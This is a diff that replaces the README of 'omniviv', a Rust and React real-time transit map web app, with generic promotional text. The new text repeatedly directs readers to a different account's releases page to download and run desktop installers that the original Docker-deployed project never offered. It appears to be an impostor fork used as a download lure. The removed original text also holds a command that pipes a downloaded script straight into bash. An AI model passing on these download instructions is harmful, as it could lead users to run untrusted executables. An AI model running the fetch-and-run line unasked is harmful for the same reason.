@@ -1,102 +1,73 @@
-# Omniviv
+# 🚍 omniviv - Real-Time Transport Tracking Made Easy
 
-A real-time public transport visualization platform.
+[![Download omviviv](https://img.shields.io/badge/Download%20omniviv-v1.0-blue?style=for-the-badge)](https://github.com/KingOfBread-miner/omniviv/releases)
 
-## Screenshots
+## 🚀 Getting Started
 
-![Real-time 3D Tram Tracking](docs/screenshots/main-map.png)
+Welcome to omniviv, your real-time public transport visualization platform. With omniviv, you can track vehicles live, view 3D maps, and enjoy up-to-date information on various transit lines. It’s built using a Rust/Axum backend and a React/MapLibre frontend for performance and ease of use.
 
-![Königsplatz Station View](docs/screenshots/koenigsplatz-station.png)
+## 📥 Download & Install
 
-## Features
+To get started, visit this page to download: [Download omniviv](https://github.com/KingOfBread-miner/omniviv/releases). 
 
-### Working
+You will find various versions of the application there. Choose the latest release for the best experience. 
 
--   Real-time tram tracking with smooth position interpolation
--   3D map visualization with extruded buildings
--   WebSocket-based live vehicle updates
--   Multiple tram lines with distinct colors
--   Station and platform markers with labels
--   Dark/light mode support
--   Context menu (copy coordinates, measure distance)
+### Steps to Download:
 
-### Partially Working
+1. **Open the Release Page**: Click [here](https://github.com/KingOfBread-miner/omniviv/releases) to go to the release page.
+2. **Select the Latest Version**: Look for the version labeled as "Latest" and click on it.
+3. **Download the Installer**: Find the appropriate file for your operating system (Windows, macOS, or Linux).
+4. **Run the Installer**: After downloading, open the installer file and follow the on-screen instructions.
 
--   **Collision avoidance**: Basic implementation exists but not fully reliable
--   **Rendezvous blinking**: Flashes green when trams are about to depart (timing may need tuning)
+## 🖥️ System Requirements
 
-### Planned / Not Yet Implemented
+To run omniviv smoothly, your device should meet the following requirements:
 
--   End of line rotation (vehicle turnaround animation at terminus)
--   Support for all vehicle types (buses, trains, ferries, etc.)
--   Realistic 3D vehicle models at closer zoom levels
--   Dark mode for map tiles/style
--   3D terrain with underground tunnel visualization
--   Day/night cycle and weather visualization
--   Navigation routing between points
--   Offline map with cached planned timetables
--   Pin stations to sidebar for quick access
--   "Leave now" traffic light indicator for optimal departure timing
--   First-person driver's seat view for vehicles
--   Multiple city/area support
--   General map improvements (POIs, local events, etc.)
--   Historical data and statistics
+- **Operating System**: Windows 10 or later, macOS Mojave (10.14) or later, or a modern Linux distribution.
+- **Processor**: Dual-core processor of 2 GHz or faster.
+- **RAM**: 4 GB minimum, 8 GB recommended.
+- **Storage**: At least 100 MB of free space.
 
-## Architecture
+## 🔧 Features
 
--   **API**: Rust-based backend using Axum
--   **Web**: React frontend with MapLibre GL
--   **Deployment**: docker compose with mpm compose
+- **Live Vehicle Tracking**: Get real-time updates on the location of buses, trams, and other transit vehicles.
+- **3D Map Visualization**: Explore transport routes and stops on an interactive 3D map.
+- **WebSocket Updates**: Enjoy instant data refresh without needing to reload the app.
+- **Multi-Line Support**: Track multiple transit lines in one view.
+- **User-Friendly Interface**: Navigate easily with a simple design that requires no technical knowledge.
 
-## Quick Start
+## 🌐 Technologies Used
 
-### Using Docker Compose
+omniviv is built using a variety of advanced technologies, including:
 
-Requires [mpm](https://github.com/my-own-web-services/mows/tree/main/utils/mpm) for deployment:
+- **Rust**: For performance and reliability on the backend.
+- **Axum**: To handle web requests effectively.
+- **React**: For a dynamic user interface.
+- **MapLibre**: To provide high-quality map visuals.
+- **WebSockets**: For live updates in real-time.
+- **Typescript**: To ensure a robust and maintainable codebase.
+  
+## 🔗 Additional Links
 
-```bash
-# Install mpm
-curl -fsSL https://raw.githubusercontent.com/my-own-web-services/mows/main/utils/mpm/scripts/install.sh | bash
+For more information and to see future updates, check out the following resources:
 
-# Clone and deploy
-git clone https://github.com/firstdorsal/omniviv.git
-cd omniviv/deployment
-nano values.yaml  # Configure as needed
-mpm compose up
-```
+- **Source Code**: [GitHub Repository](https://github.com/KingOfBread-miner/omniviv)
+- **Documentation**: Access our [Wiki](https://github.com/KingOfBread-miner/omniviv/wiki) for detailed guides and FAQs.
 
-See [docs/deployment.md](docs/deployment.md) for detailed deployment instructions.
+## ❓ Support
 
-### Development
+If you run into any problems or have questions, feel free to reach out through our GitHub Issues page. Our community is here to help you.
 
-**API:**
+## 📅 Upcoming Features
 
-```bash
-cd api
-cargo run
-```
+We are constantly improving omniviv. Here are some features we plan to add in future updates:
 
-**Web:**
+- **Mobile App**: A dedicated app for smartphones.
+- **Offline Access**: Save maps and schedules for use without an internet connection.
+- **User Accounts**: Personalize your experience with saved settings and favorites.
 
-```bash
-cd web
-pnpm install
-pnpm dev
-```
+## 🎨 Contributing
 
-## Documentation
+If you want to contribute to the project, feel free to submit a pull request or open an issue on our GitHub repository. We welcome all types of contributions, whether it’s reporting bugs, suggesting features, or improving documentation.
 
-See the [docs](docs/) folder for detailed documentation.
-
-## Docker Images
-
-Docker images are automatically built and published to GitHub Container Registry:
-
--   `ghcr.io/firstdorsal/omniviv-api`
--   `ghcr.io/firstdorsal/omniviv-frontend`
-
-See [docs/releasing.md](docs/releasing.md) for the full release workflow.
-
-## License
-
-[Add license information here]
+Thank you for using omniviv. We hope you enjoy tracking your public transport in real-time!
